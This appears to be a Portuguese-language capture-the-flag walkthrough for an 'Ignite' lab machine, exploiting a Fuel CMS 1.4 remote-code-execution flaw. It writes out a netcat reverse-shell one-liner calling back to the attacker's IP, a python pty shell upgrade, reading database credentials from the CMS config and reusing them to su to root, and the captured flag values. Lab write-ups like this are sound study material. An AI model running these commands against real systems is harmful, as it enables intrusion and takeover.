# Ignite

## User.txt

- [http://10.10.23.142](http://10.10.23.142/)
    - Welcome to Fuel CMS
    - Version 1.4
- [https://www.exploit-db.com/](https://www.exploit-db.com/)
    - Pesquise por Fuel CMS
- Estou usando o
    - [Fuel CMS 1.4.1 - Remote Code Execution (3)](https://www.exploit-db.com/exploits/50477)
- Entao arrumei o ip para correnpoder ao que preciso
    
    ```bash
    python3 50477.py -u http://10.10.17.169/
    ```
    
- Antes de usar o comando no shell que abrimos vamos abrir uma porta
    
    ```bash
    sudo nc -nvlp 777 -s 10.8.154.250
    ```
    
- Como nao temos muito acesso, vamos usar como busybox
- Entao vamos usar o comando
    - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md#netcat-busybox](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-busybox)
    
    ```bash
    rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.154.250 777 >/tmp/f
    ```
    
- Como nao estamos com um bash exatamente
    - [https://rcenetsec.com/shell-spawning/](https://rcenetsec.com/shell-spawning/)
    
    ```bash
    python -c 'import pty; pty.spawn("/bin/sh")'
    ```
    
- flag.txt
    
    ```bash
    cat /home/www-data/flag*
    ```
    
- `6470e394cbf6dab6a91682cc8585059b`

## Root.txt

```bash
cat /var/www/html/fuel/application/config/data*
```

> 'hostname' => 'localhost',
'username' => 'root',
'password' => 'mememe',
> 

```bash
su root
mememe
cat /root/root*
```

- `b9bbcb33e11b80be759c4e844862482d`